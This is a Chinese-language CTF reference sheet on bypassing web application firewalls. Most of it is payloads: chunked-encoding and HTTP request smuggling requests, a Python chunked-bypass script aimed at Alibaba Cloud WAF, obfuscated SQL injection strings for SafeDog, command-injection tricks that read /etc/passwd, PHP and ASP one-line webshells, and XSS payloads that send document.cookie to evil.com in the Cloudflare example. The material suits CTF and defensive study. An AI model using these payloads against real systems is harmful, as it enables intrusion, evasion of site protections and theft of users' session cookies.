---
category: "WAF绕过"
tags: ["WAF", "绕过", "SQL注入绕过", "XSS绕过", "命令注入绕过", "文件上传绕过", "编码绕过", "分块传输", "HTTP走私", "协议层绕过"]
difficulty: "高级"
---

# WAF绕过技术汇总

## 1. 概述
WAF（Web Application Firewall）是CTF中常见的防御层。WAF绕过不是一个独立的漏洞类型，而是贯穿所有Web漏洞的高级技巧。本文件从多维度汇总WAF绕过技术，涵盖SQL注入、XSS、命令注入、文件上传等场景下的通用和专用绕过方法。

**WAF绕过核心思路：**
- **协议层面**：分块传输(Chunked)、HTTP走私(Smuggling)、Parameter Pollution
- **编码层面**：URL编码、Unicode编码、Base64、Hex、多重编码
- **语法层面**：注释插入、大小写变换、等价替换
- **逻辑层面**：参数污染(HPP/HPF)、超长参数截断、冷门语法

## 2. 核心原理

WAF检测依赖于规则匹配，具体包括：
- 正则匹配黑名单关键词
- 语义分析/语法树检测
- 行为异常检测
- 机器学习模型

绕过原理：构造在目标应用（如MySQL/PHP/JavaScript引擎）中能正常执行的语义，但匹配不到WAF规则的输入。

## 3. 关键技巧与Payload

### 3.1 HTTP协议层绕过

**分块传输编码 (Chunked Transfer Encoding)：**
```http
POST /api HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

1
;
4
id=1
10
 UNION SELECT 1,2,3
0

```
注意：每个chunk由十六进制长度+分号可选注释+数据+CRLF组成。

**阿里云WAF分块绕过脚本框架：**
```python
import requests

def chunked_body(data, chunk_size=2):
    result = b''
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        hex_len = hex(len(chunk))[2:].encode()
        result += hex_len + b'\r\n' + chunk + b'\r\n'
    result += b'0\r\n\r\n'
    return result

data = b"id=1 UNION SELECT 1,2,3--+"
r = requests.post('http://target.com/api',
    headers={'Transfer-Encoding': 'chunked'},
    data=chunked_body(data, 3))
```

**HTTP请求走私（HTTP Request Smuggling）：**
```
# CL.TE走私（Content-Length + Transfer-Encoding歧义）
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G      # ← 这个G被视为下一个请求的开头

# TE.CL走私
# 前端用TE，后端用CL
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /admin HTTP/1.1
Host: localhost
Content-Length: 15

x=1
0

```

**Host头攻击/滥用：**
```
# 利用不同WAF检测逻辑
GET /api?id=1 UNION SELECT 1,2,3 HTTP/1.1
Host: 127.0.0.1  # 某些WAF对内网目标放行
```

**Parameter Pollution (HPP)：**
```http
# 多个同名参数（不同后端处理方式不同）
?id=1&id=2 UNION SELECT 1,2,3

# PHP: 取最后一个 (id=2...)
# ASP.NET: 用逗号拼接 (id=1, 2 UNION...)
# JSP: 取第一个 (id=1)

# 利用
?id=1%26id=-1 UNION SELECT 1,2,3--
```

**超长参数截断：**
```bash
# WAF有参数长度限制
# 前面填充大量字符绕过检测
?id=1+AAAAAAAAAAAAA...(大量A)...AAA+UNION+SELECT+1,2,3--+
```

### 3.2 编码绕过

**URL编码绕过：**
```
# 单次编码
' → %27
空格 → %20

# 双重编码（WAF只解码一次）
' → %25%32%37 (%25=%, %32=2, %37=7)
UNION → %55%4E%49%4F%4E

# 部分编码（绕过正则）
UNI%4FN SELECT → UNION SELECT
SEL%45CT → SELECT

# 混合编码
%55NION %53ELECT → UNION SELECT
```

**Unicode规范化绕过：**
```
# 利用不同语言/框架Unicode规范化行为差异

# MySQL (某些版本将ß→ss)
UNIßN  → (unlikely but test)

# 全角字符转半角
ＳＥＬＥＣＴ → 规范化后 → SELECT

# 同形字符
# LATIN SMALL LETTER DOTLESS I + LATIN SMALL LIGATURE FI
```

**Base64绕过：**
```
# 假设应用会Base64解码
# WAF检测原始Base64字符串，应用端解码后执行
YQ== → a (绕不过，但作为组合技时有意义)

# 有些中间件支持Base64 URL参数
# 如Apache mod_rewrite Base64
```

**Hex/Char编码（SQL注入）：**
```sql
-- MySQL char()
SELECT char(115,101,108,101,99,116) → "select"

-- MSSQL
SELECT CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)

-- JS fromCharCode
String.fromCharCode(115,101,108,101,99,116)
```

### 3.3 SQL注入WAF绕过专用

**空白字符替代：**
```sql
-- 可以替代空格的字符
%09      -- tab
%0a      -- 换行
%0b      -- 垂直tab
%0c      -- 换页
%0d      -- 回车
%a0      -- 不换行空格
/**/     -- 注释块
()       -- 括号（用于函数和子查询）

-- 示例
SELECT/**/1,2,3
SELECT%0a1,2,3
SELECT
1,2,3

-- 所有组合
SEL%0aECT%09/**/1,(2),3%0bFROM%0cflag--+
```

**注释绕关键字：**
```sql
-- 内联注释（MySQL特性/部分通用）
SEL/**/ECT
UNI/**/ON
SEL/*!50000ECT*/  -- MySQL条件注释（版本号>=5.00.00时执行）

-- 反引号（MySQL）
SELECT `column` FROM `table`

-- 括号嵌套
SELECT(1),(2)FROM(flag)
```

**大小写/大小写混合：**
```sql
SeLeCt
UnIoN
SeLEcT 1,2,3 frOm flag
```

**等价关键字替换（仅MySQL）：**
```sql
-- OR  替代: ||, | (位或)
-- AND 替代: &&, & (位于)
-- =   替代: LIKE, REGEXP, BETWEEN, IN

-- 示例
?id=1 || 1=1
?id=1 | 1
?id=1 && 1=1
?id=1 AND 1 LIKE 1
?id=1 AND 1 BETWEEN 1 AND 1
```

**浮点数/科学计数法绕过：**
```sql
-- 用于WHERE子句
-- WHERE id=1  被检测
-- WHERE id=1.0  → 正常
-- WHERE id=0.1e1 → 1.0 → 正常

UNION SELECT 1e0,2,3  -- 数字检测绕过
```

**多字节/宽的字符绕过（GBK）：**
```sql
-- PHP GBK + addslashes
%df' OR 1=1--+         → '運'逃逸

-- 其他宽字节
%81 ~ %FE 范围
%bf%27 → 縗' （%bf%5c%27 → %bf%5c=某个汉字 + '）
```

### 3.4 XSS WAF绕过专用

**标签/事件处理器替代：**
（详见02-XSS与前端漏洞.md 第3章）

**HTML实体绕过：**
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
```

**混淆/编码绕过：**
```html
<!-- 多种编码混合 -->
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

<!-- jsfuck -->
<img src=x onerror="[][(![]+[])[+!![]]+...">
```

**畸形标签/前缀无视：**
```html
<script>alert(1)</script>     → 被拦截
<scr<script>ipt>alert(1)</script> → 嵌套绕过
<object data="data:text/html;base64,...">
```

### 3.5 命令注入WAF绕过专用

**等价命令替换：**
```
cat → more, less, tac, tail, head, nl, od, xxd, sort, strings, dd
/bin/cat → /b'is'n/ca't
```

**引号/转义绕过（bash）：**
```bash
cat → ca""t → c'a't → c\a\t → /bin/c?t
$'cat' /etc/passwd
```

**变量构造命令：**
```bash
a=ca;b=t;a$b /flag
```

**通配符/glob：**
```bash
cat /f???
cat /fla*
cat /fla[g]
cat /[a-z]lag
```

### 3.6 文件上传绕过WAF

**文件名绕过：**
```
shell.php → shell.pHp → shell.PHP5 → shell.phtml
shell.php. → shell.php → shell.php::$DATA

# Content-Disposition混淆
filename="shell.php";
filename=shell.php
filename*=utf-8''shell.php
```

**文件内容编码/混入：**
```
# PHP变量函数绕过
<?=$_GET[1]?>
<?=eval($_POST[1])?>

# 利用exif/注释藏匿
# php_value在.jpg的EXIF中

# 短标签绕过
<% eval(request("1")) %>   # ASP风格
```

### 3.7 冷门技巧集合

**Content-Type绕过：**
```
# 把攻击载荷放入WAF不检测的Content-Type
Content-Type: application/json  → WAF可能不检查JSON body的SQL注入
Content-Type: application/xml   → WAF可能重点检测XML相关内容
Content-Type: multipart/form-data → 部分WAF不检测multipart内部内容
```

**HTTP Method绕过：**
```
# WAF可能只对GET/POST做全面检测
# 尝试 PUT, PATCH, OPTIONS, CONNECT
# 某些框架将所有method视为相同
```

**冷门协议/端口绕过：**
```
# 请求走HTTPS时WAF可能只解HTTP层
# 使用HTTP/2时某些WAF规则不适用（如分块在HTTP/2中不同）
```

**利用WAF自身的bugs：**
```
# 某些WAF对multipart boundary解析不当
# 某些WAF对大请求体(size>阈值)跳过
# 某些WAF对gzip/deflate压缩的body检测不完整
```

## 4. 常见误区与注意事项
1. **WAF不是全能的**：不要假设WAF能防住一切。WAF基于规则引擎，总有规则漏洞。
2. **不要盲目堆砌Payload**：先确认目标是否有WAF、是什么WAF（安全狗？D盾？Cloudflare？Aliyun WAF？），不同的WAF有不同的绕过姿势。
3. **WAF版本差异**：同一品牌的WAF在不同版本的行为可能差别很大，如CloudFlare WAF的规则一直在更新。
4. **旁路攻击**：如果WAF后有多台服务器，直接攻击内网IP比攻击域名可能绕开WAF。
5. **IP白名单**：某些WAF对白名单IP（如内网、VPN、特定IP段）放行，可利用SSRF+内网代理绕过。
6. **速度限制**：高频攻击可能触发WAF的Rate Limiting，导致IP被封。CTF中注意控制请求频率。
7. **编码层数**：WAF通常只解码一层URL编码。但有时框架/中间件会多层解码，可利用此差异。
8. **HTTP/2与HTTP/1.1差异**：很多WAF对HTTP/2的支持不完善，例如HTTP/2中header使用小写+二进制帧，可能与规则中的大写header名不匹配。
9. **offline策略**：准备WAF指纹识别脚本（通过特殊请求触发拦截页面分析）；分层绕过策略文档（从协议→编码→语法逐步尝试）；本地搭建常见WAF环境测试。

## 5. 实战示例

### 示例1：安全狗SQL注入绕过
```
环境：Apache + PHP + 安全狗(SafeDog)
```
绕过策略：
```bash
# 1. 不要用 --+ 注释 → 用 --%20
# 2. UNION SELECT → /*!50000UNION%0aSELECT*/
# 3. 不要用括号包裹函数
# 4. 使用浮点值

?id=-1 /*!50000UNION%0aSELECT*/ 1,2,3--%20
?id=-1 /*!50000UNION%0aSELECT*/ 1,group_concat(table_name),3 /*!50000FROM*/ information_schema./*!50000table_s*/--%20
```

### 示例2：CloudFlare WAF XSS绕过
```
绕过策略：
```
```html
<!-- 1. 使用不常见的事件处理器 -->
<details open ontoggle="fetch('http://evil.com/?c='+document.cookie)">

<!-- 2. 通过SVG -->
<svg><animate onbegin="a=document;b=document.cookie;a['location']='http://evil.com/?c='+b">

<!-- 3. CSS注入结合 -->
<style>@import url('http://evil.com/?c=EXFIL')</style>
```

## 6. 相关知识点
- SQL注入绕过技巧（见01-SQL注入全解）
- XSS绕过CSP（见02-XSS与前端漏洞）
- 命令注入空格/关键字绕过（见08-命令注入与代码注入）
- 文件上传WAF绕过（见04-文件上传漏洞）
- SSTI过滤绕过（见03-服务端模板注入SSTI）
- 分块传输与HTTP走私参考RFC7230
